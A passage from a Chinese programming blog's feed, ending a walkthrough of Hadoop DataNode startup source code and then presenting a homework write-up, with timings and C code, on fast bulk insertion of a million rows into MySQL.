</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">infoServer</span> <span class="o">=</span> <span class="o">(</span><span class="n">secureResources</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>        <span class="o">?</span> <span class="k">new</span> <span class="n">HttpServer</span><span class="o">(</span><span class="s">&quot;datanode&quot;</span><span class="o">,</span> <span class="n">infoHost</span><span class="o">,</span> <span class="n">tmpInfoPort</span><span class="o">,</span> <span class="n">tmpInfoPort</span> <span class="o">==</span> <span class="mi">0</span><span class="o">,</span>
</span><span class='line'>                <span class="n">conf</span><span class="o">,</span> <span class="n">SecurityUtil</span><span class="o">.</span><span class="na">getAdminAcls</span><span class="o">(</span><span class="n">conf</span><span class="o">,</span> <span class="n">DFSConfigKeys</span><span class="o">.</span><span class="na">DFS_ADMIN</span><span class="o">))</span>
</span><span class='line'>        <span class="o">:</span> <span class="k">new</span> <span class="n">HttpServer</span><span class="o">(</span><span class="s">&quot;datanode&quot;</span><span class="o">,</span> <span class="n">infoHost</span><span class="o">,</span> <span class="n">tmpInfoPort</span><span class="o">,</span> <span class="n">tmpInfoPort</span> <span class="o">==</span> <span class="mi">0</span><span class="o">,</span>
</span><span class='line'>                <span class="n">conf</span><span class="o">,</span> <span class="n">SecurityUtil</span><span class="o">.</span><span class="na">getAdminAcls</span><span class="o">(</span><span class="n">conf</span><span class="o">,</span> <span class="n">DFSConfigKeys</span><span class="o">.</span><span class="na">DFS_ADMIN</span><span class="o">),</span>
</span><span class='line'>                <span class="n">secureResources</span><span class="o">.</span><span class="na">getListener</span><span class="o">());</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">infoServer</span><span class="o">.</span><span class="na">addServlet</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="s">&quot;/blockScannerReport&quot;</span><span class="o">,</span>
</span><span class='line'>            <span class="n">DataBlockScanner</span><span class="o">.</span><span class="na">Servlet</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">infoServer</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// BlockTokenSecretManager is created here, but it shouldn&#39;t be</span>
</span><span class='line'>    <span class="c1">// used until it is initialized in register().</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">blockTokenSecretManager</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BlockTokenSecretManager</span><span class="o">(</span><span class="kc">false</span><span class="o">,</span>
</span><span class='line'>            <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
</span><span class='line'>    <span class="c1">//init ipc server</span>
</span><span class='line'>    <span class="n">InetSocketAddress</span> <span class="n">ipcAddr</span> <span class="o">=</span> <span class="n">NetUtils</span><span class="o">.</span><span class="na">createSocketAddr</span><span class="o">(</span>
</span><span class='line'>            <span class="n">conf</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&quot;dfs.datanode.ipc.address&quot;</span><span class="o">));</span>
</span><span class='line'>    <span class="c1">// 这个RPC服务器和NameNode上的RPC服务器是一样的实现</span>
</span><span class='line'>    <span class="n">ipcServer</span> <span class="o">=</span> <span class="n">RPC</span><span class="o">.</span><span class="na">getServer</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">ipcAddr</span><span class="o">.</span><span class="na">getHostName</span><span class="o">(),</span> <span class="n">ipcAddr</span><span class="o">.</span><span class="na">getPort</span><span class="o">(),</span>
</span><span class='line'>            <span class="n">conf</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="s">&quot;dfs.datanode.handler.count&quot;</span><span class="o">,</span> <span class="mi">3</span><span class="o">),</span> <span class="kc">false</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span>
</span><span class='line'>            <span class="n">blockTokenSecretManager</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>总结一下DataNode初始化的时候大致干了些什么事。首先初始化了一个NameNode的Remote Proxy，这样以后和NameNode进行通信就方便啦。然后就把上一节介绍的两大阵营的类给初始化好，这样以后DataNode就可以通过FSDataset和DataStorage来操作DataNode中存储的所有数据了。接下来初始化了三个服务器和一个DataBlockScanner，三个服务器分别是流式机制的dataXceiverServer，web服务器infoServer和RPC服务器ipcServer。<br/>
所有这些都初始化好过后，<code>createDataNode()</code>方法就会调用DataNode的<code>run()</code>方法，然后DataNode就正式跑起来了，下面看源代码。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* DataNode.java */</span>
</span><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">dataXceiverServer</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
</span><span class='line'>    <span class="n">ipcServer</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">while</span> <span class="o">(</span><span class="n">shouldRun</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">startDistributedUpgradeIfNeeded</span><span class="o">();</span>
</span><span class='line'>            <span class="n">offerService</span><span class="o">();</span> <span class="c1">// 主要是这个函数</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">shouldRun</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                    <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">5000</span><span class="o">);</span>
</span><span class='line'>                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">ie</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="n">shutdown</span><span class="o">();</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/**</span>
</span><span class='line'><span class="cm"> * Main loop for the DataNode.  Runs until shutdown,</span>
</span><span class='line'><span class="cm"> * forever calling remote NameNode functions.</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">offerService</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">while</span> <span class="o">(</span><span class="n">shouldRun</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>            <span class="kt">long</span> <span class="n">startTime</span> <span class="o">=</span> <span class="n">now</span><span class="o">();</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// 过一段时间执行一次</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">startTime</span> <span class="o">-</span> <span class="n">lastHeartbeat</span> <span class="o">&gt;</span> <span class="n">heartBeatInterval</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="c1">//</span>
</span><span class='line'>                <span class="c1">// All heartbeat messages include following info:</span>
</span><span class='line'>                <span class="c1">// -- Datanode name</span>
</span><span class='line'>                <span class="c1">// -- data transfer port</span>
</span><span class='line'>                <span class="c1">// -- Total capacity</span>
</span><span class='line'>                <span class="c1">// -- Bytes remaining</span>
</span><span class='line'>                <span class="c1">//</span>
</span><span class='line'>                <span class="n">lastHeartbeat</span> <span class="o">=</span> <span class="n">startTime</span><span class="o">;</span>
</span><span class='line'>                <span class="c1">// 发送心跳包表明DataNode还活着，同时获得NameNode传给DataNode的指令</span>
</span><span class='line'>                <span class="c1">// NameNode和DataNode遵循严格的C/S架构，NameNode不会主动去联系DataNode的</span>
</span><span class='line'>                <span class="c1">// 只有在DataNode联系它的时候才借机传输点命令给DataNode</span>
</span><span class='line'>                <span class="n">DatanodeCommand</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">namenode</span><span class="o">.</span><span class="na">sendHeartbeat</span><span class="o">(</span><span class="n">dnRegistration</span><span class="o">,</span>
</span><span class='line'>                        <span class="n">data</span><span class="o">.</span><span class="na">getCapacity</span><span class="o">(),</span>
</span><span class='line'>                        <span class="n">data</span><span class="o">.</span><span class="na">getDfsUsed</span><span class="o">(),</span>
</span><span class='line'>                        <span class="n">data</span><span class="o">.</span><span class="na">getRemaining</span><span class="o">(),</span>
</span><span class='line'>                        <span class="n">xmitsInProgress</span><span class="o">.</span><span class="na">get</span><span class="o">(),</span>
</span><span class='line'>                        <span class="n">getXceiverCount</span><span class="o">());</span>
</span><span class='line'>                <span class="k">if</span> <span class="o">(!</span><span class="n">processCommand</span><span class="o">(</span><span class="n">cmds</span><span class="o">))</span>
</span><span class='line'>                    <span class="k">continue</span><span class="o">;</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// check if there are newly received blocks</span>
</span><span class='line'>            <span class="n">Block</span> <span class="o">[]</span> <span class="n">blockArray</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>
</span><span class='line'>            <span class="n">String</span> <span class="o">[]</span> <span class="n">delHintArray</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>
</span><span class='line'>            <span class="kd">synchronized</span><span class="o">(</span><span class="n">receivedBlockList</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="kd">synchronized</span><span class="o">(</span><span class="n">delHints</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="kt">int</span> <span class="n">numBlocks</span> <span class="o">=</span> <span class="n">receivedBlockList</span><span class="o">.</span><span class="na">size</span><span class="o">();</span>
</span><span class='line'>                    <span class="k">if</span> <span class="o">(</span><span class="n">numBlocks</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                        <span class="c1">//</span>
</span><span class='line'>                        <span class="c1">// Send newly-received blockids to namenode</span>
</span><span class='line'>                        <span class="c1">//</span>
</span><span class='line'>                        <span class="n">blockArray</span> <span class="o">=</span> <span class="n">receivedBlockList</span><span class="o">.</span><span class="na">toArray</span><span class="o">(</span><span class="k">new</span> <span class="n">Block</span><span class="o">[</span><span class="n">numBlocks</span><span class="o">]);</span>
</span><span class='line'>                        <span class="n">delHintArray</span> <span class="o">=</span> <span class="n">delHints</span><span class="o">.</span><span class="na">toArray</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="n">numBlocks</span><span class="o">]);</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">blockArray</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="c1">// 告诉NameNode最新接收到的Block文件</span>
</span><span class='line'>                <span class="n">namenode</span><span class="o">.</span><span class="na">blockReceived</span><span class="o">(</span><span class="n">dnRegistration</span><span class="o">,</span> <span class="n">blockArray</span><span class="o">,</span> <span class="n">delHintArray</span><span class="o">);</span>
</span><span class='line'>                <span class="kd">synchronized</span> <span class="o">(</span><span class="n">receivedBlockList</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="kd">synchronized</span> <span class="o">(</span><span class="n">delHints</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">blockArray</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>                            <span class="n">receivedBlockList</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">blockArray</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
</span><span class='line'>                            <span class="n">delHints</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">delHintArray</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
</span><span class='line'>                        <span class="o">}</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// Send latest blockinfo report if timer has expired.</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">startTime</span> <span class="o">-</span> <span class="n">lastBlockReport</span> <span class="o">&gt;</span> <span class="n">blockReportInterval</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">isAsyncBlockReportReady</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                    <span class="c1">// Create block report</span>
</span><span class='line'>                    <span class="kt">long</span> <span class="n">brCreateStartTime</span> <span class="o">=</span> <span class="n">now</span><span class="o">();</span>
</span><span class='line'>                    <span class="n">Block</span><span class="o">[]</span> <span class="n">bReport</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">retrieveAsyncBlockReport</span><span class="o">();</span>
</span><span class='line'>
</span><span class='line'>                    <span class="c1">// Send block report</span>
</span><span class='line'>                    <span class="kt">long</span> <span class="n">brSendStartTime</span> <span class="o">=</span> <span class="n">now</span><span class="o">();</span>
</span><span class='line'>                    <span class="c1">// 报告Block文件的信息</span>
</span><span class='line'>                    <span class="n">DatanodeCommand</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">namenode</span><span class="o">.</span><span class="na">blockReport</span><span class="o">(</span><span class="n">dnRegistration</span><span class="o">,</span>
</span><span class='line'>                            <span class="n">BlockListAsLongs</span><span class="o">.</span><span class="na">convertToArrayLongs</span><span class="o">(</span><span class="n">bReport</span><span class="o">));</span>
</span><span class='line'>
</span><span class='line'>                    <span class="c1">// omitted</span>
</span><span class='line'>                    <span class="n">processCommand</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</span><span class='line'>                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>                    <span class="n">data</span><span class="o">.</span><span class="na">requestAsyncBlockReport</span><span class="o">();</span>
</span><span class='line'>                    <span class="k">if</span> <span class="o">(</span><span class="n">lastBlockReport</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// this isn&#39;t the first report</span>
</span><span class='line'>                        <span class="c1">// omitted</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// start block scanner</span>
</span><span class='line'>            <span class="c1">// 只会执行一次</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">blockScanner</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">blockScannerThread</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>                    <span class="n">upgradeManager</span><span class="o">.</span><span class="na">isUpgradeCompleted</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">blockScannerThread</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Daemon</span><span class="o">(</span><span class="n">blockScanner</span><span class="o">);</span>
</span><span class='line'>                <span class="n">blockScannerThread</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">//</span>
</span><span class='line'>            <span class="c1">// There is no work to do;  sleep until hearbeat timer elapses, </span>
</span><span class='line'>            <span class="c1">// or work arrives, and then iterate again.</span>
</span><span class='line'>            <span class="c1">//</span>
</span><span class='line'>            <span class="kt">long</span> <span class="n">waitTime</span> <span class="o">=</span> <span class="n">heartBeatInterval</span> <span class="o">-</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">-</span> <span class="n">lastHeartbeat</span><span class="o">);</span>
</span><span class='line'>            <span class="kd">synchronized</span><span class="o">(</span><span class="n">receivedBlockList</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="o">(</span><span class="n">waitTime</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">receivedBlockList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                        <span class="n">receivedBlockList</span><span class="o">.</span><span class="na">wait</span><span class="o">(</span><span class="n">waitTime</span><span class="o">);</span>
</span><span class='line'>                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">ie</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                    <span class="n">delayBeforeBlockReceived</span><span class="o">();</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span> <span class="c1">// synchronized</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">RemoteException</span> <span class="n">re</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="c1">// omitted</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span> <span class="c1">// while (shouldRun)</span>
</span><span class='line'><span class="o">}</span> <span class="c1">// offerService</span>
</span></code></pre></td></tr></table></div></figure>


<p>可以看到DataNode把那几个服务器和DataBlockScanner作为独立的线程启动后，自己也进入了一个while循环执行以下的操作：定期发送心跳包和Block信息报告，还发送最新接收到的Block文件信息。至此对于DataNode启动的分析就结束了，在这一过程中遇到的所有细节都没有深究，比如DataBlockScanner的原理是什么，这些都留到以后再介绍。</p>

<p>参考链接：
<a href="http://caibinbupt.iteye.com/blog/287870">1</a></p>

<h2><a id="reference"></a> 参考资料</h2>

<p>在研究源码的过程中也找到了一些比较好的参考资料，仅供参考</p>

<ol>
<li><a href="http://blog.csdn.net/xhh198781">xhh198781的博客</a></li>
<li><a href="http://caibinbupt.iteye.com">caibinbupt的博客</a></li>
<li><a href="http://india.paxcel.net:6060/LargeDataMatters/wp-content/uploads/2010/09/HDFS1.pdf">一份pdf文件</a></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Insert One Million Rows Into Database]]></title>
    <link href="http://JiajunYao.github.com/blog/2012/06/02/insert-one-million-rows-into-database/"/>
    <updated>2012-06-02T15:30:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2012/06/02/insert-one-million-rows-into-database</id>
    <content type="html"><![CDATA[<p>数据库课的一次作业，要求是尽可能快的插入一百万条数据到数据库。这也是第一次和数据库性能接触，在做作业的过程中也有所感受所以决定写下来。这次作业我选择的是用C和MySQL来完成，并使用MySQL的C API。程序的逻辑很简单就是随机生成一百万条数据然后插入数据库，关键是如何能快速的插入。我进行了多次尝试，每次尝试都在插入数据上有所提升。</p>

<!-- more -->


<p>最开始的尝试就是使用InnoDB引擎，插入就是一个for循环做一百万次，每次循环里都调用mysql_query()执行一条插入语句。实验表明如果这样做的话非常慢我花了200分钟才插入了37万多条数据。显然这种插入方法是不行的。而这样插入非常慢的原因是InnoDB是事务型数据库，而默认情况下每一次调用mysql_query()执行的insert操作都会被看成是一个transaction，InnoDB对于transaction的处理花费了太多的时间，它需要进行写日志等操作。</p>

<p>知道transaction对数据库插入速度有这样大的影响后，接下来就是要降低事务数，最好将一百万条插入操作都放在一个transaction中完成。于是我在程序里加了两行代码，第一行是调用mysql_autocommit()将auto commit关闭，这样MySQL就不会将每一次的插入操作都当成一个transaction了。第二行是在程序最后加上mysql_commit()手动提交transaction，就这两行代码导致插入时间大幅减少。我用time命令记录了程序的运行时间，结果如下：</p>

<pre><code>real 1m8.693s
user 0m5.615s
sys  0m10.081s
</code></pre>

<p>接下来的尝试就是使用MySQL的multiple insert也就是一条insert语句插入多条数据，语法像这样：INSERT INTO x (a, b) VALUES (1, 2), (2, 3), (3, 5); 。这个方法也是MySQL官网建议的提高插入速度的方法之一。我想做的事就是用一条insert语句插入一百万条数据。为了达到这个目的我就要先构造这样的一个insert语句，方法很简单就是先malloc一个很大的字符数组，然后不停的使用strcat()来向这个字符数组中填值，也就是说要调用一百万次strcat()来构造这样的一个insert语句。当我跑这个重新改后的程序时发现构造这样的一个insert语句非常慢，无法在有限的时间内完成。后来发现问题出在strcat()上，实现这个方法的算法很低效，这个算法是设计来让人们调用一次的而不是一百万次的，根据时间复杂度调用一百万次strcat()就会非常耗时，具体关于strcat()问题可以参见<a href="http://www.joelonsoftware.com/articles/fog0000000319.html">Joel的文章</a>。问题的解决办法就是自己写一个高效的strcat()方法，这个在Joel的文章里也给出来了。把这个问题解决后构造一个insert语句就是瞬间的事了，在这里算法课上反复强调的时间复杂度得到了充分的体现。把这个问题解决后又出现了一个新的问题那就是我一跑程序就告诉我&#8221;MySQL server has gone away&#8221;，上网找了一下发现原因是发送的insert语句太大了超出了max_allowed_packet的大小，解决方案就是把MySQL配置文件里的max_allowed_packet大小改到足够大就可以了，顿时我就觉得为什么MySQL不能直接告诉我包过大呢，非要给出一个等于没说的信息，太不友好了。解决了所有问题后这种方案终于能跑了，插入时间也进一步减小了，对于这种方案能降低插入时间的原因我猜是不是因为减少了网络中包传输的次数。我用time命令记录了程序的运行时间，结果如下：</p>

<pre><code>real 0m10.971s
user 0m0.514s
sys  0m0.008s
</code></pre>

<p>接下来做的就是换个数据库引擎把transaction的开销给消除了，我用了MyISAM引擎，这是个非事务型引擎。改完引擎后再一次发现transaction的开销好大啊。我用time命令记录了程序的运行时间，结果如下:</p>

<pre><code>real 0m3.863s
user 0m0.514s
sys  0m0.010s
</code></pre>

<p>然后还尝试了一下MySQL的必杀技load data infile，这种方法可以使插入的效率提高数倍，很适合大批量数据的插入。程序运行结果如下：</p>

<pre><code>real 0m2.481s
user 0m0.400s
sys  0m0.015s
</code></pre>

<p>最后用openmp写了一个多线程的程序来同时插入，由于测试机子是四核的所以开了四个线程。然后分别在两种数据库引擎下都做了实验，结果如下：</p>

<pre><code>MyISAM：
real 0m2.897s
user 0m0.686s
sys  0m0.019s

InnoDB：
real 0m10.780s
user 0m0.686s
sys  0m0.019s
</code></pre>

<p>在做这次数据库作业的过程中有如下感受：</p>

<ol>
<li>transaction非常耗时</li>
<li>找准性能瓶颈很重要，strcat()就是一个例子</li>
<li>性能优化是个很有趣的事，尤其是当你发现性能又提升了一个层级</li>
</ol>


<p>最后附上整个程序的代码：</p>

<div><script src='https://gist.github.com/2860838.js?file=insert_test.c'></script>
<noscript><pre><code>#include &lt;my_global.h&gt;
#include &lt;mysql.h&gt;
#include &lt;my_sys.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stddef.h&gt;
#include &lt;time.h&gt;
#include &lt;string.h&gt;
#include &lt;omp.h&gt;

#define DBHOST &quot;localhost&quot;
#define USER &quot;root&quot;
#define PASSWORD &quot;password&quot;
#define DATABASE &quot;test&quot;
#define BUFFER_SIZE 1024
#define ROW_NUM 1000000

char* mystrcat(char* dest, char* src);
void insert_test();
void parallel_insert_test();
void load_data_infile();
void print_mysql_error(MYSQL* conn, char* message);

int main(){
    parallel_insert_test();
}

void load_data_infile()
{
    MYSQL* db_conn = mysql_init(NULL);
    if(db_conn == NULL)
    {
        fprintf(stderr, &quot;mysql_init() failed\n&quot;);
        return;
    }
    if(mysql_real_connect(db_conn, DBHOST, USER, PASSWORD, DATABASE, 0, NULL, 0) == NULL)
    {
        fprintf(stderr, &quot;mysql_real_connect() failed\n&quot;);
        mysql_close(db_conn);
        return;
    }

    char query[BUFFER_SIZE];
    char* names[10] = {&quot;Mike&quot;, &quot;Bob&quot;, &quot;Jack&quot;, &quot;Alice&quot;, &quot;Cathy&quot;, &quot;Ann&quot;, &quot;Betty&quot;, &quot;Cindy&quot;, &quot;Mary&quot;, &quot;Jane&quot;};
    char* name;
    char letters[6];
    int number;
    srand(time(NULL));

    FILE* file = fopen(&quot;/tmp/mysql.txt&quot;, &quot;w+&quot;);
    for(int i = 0; i &lt; ROW_NUM; i++)
    {
        name = names[rand() % 10];
        for(int j = 0; j &lt; 5; j++)
        {
            letters[j] = 'a' + rand() % 5;
        }
        letters[5] = '\0';
        number = rand() % 20 + 1;
        fprintf(file, &quot;%s\t%s\t%d\n&quot;, name, letters, number);
    }
    fclose(file);

    if(mysql_query(db_conn, &quot;LOAD DATA INFILE '/tmp/mysql.txt' INTO TABLE test (col1, col2, col3)&quot;) != 0)
    {
        print_mysql_error(db_conn, &quot;load data infile error&quot;);
    }

    mysql_close(db_conn);
}

void parallel_insert_test()
{
    mysql_library_init(0, NULL, NULL);
    #pragma omp parallel
    {
        MYSQL* db_conn = mysql_init(NULL);
        if(db_conn == NULL)
        {
            fprintf(stderr, &quot;mysql_init() failed\n&quot;);
        }
        if(mysql_real_connect(db_conn, DBHOST, USER, PASSWORD, DATABASE, 0, NULL, 0) == NULL)
        {
            fprintf(stderr, &quot;mysql_real_connect() failed\n&quot;);
            mysql_close(db_conn);
        }

        char*  query = (char*)malloc(30000 *  BUFFER_SIZE);
        char  insert_value[30];
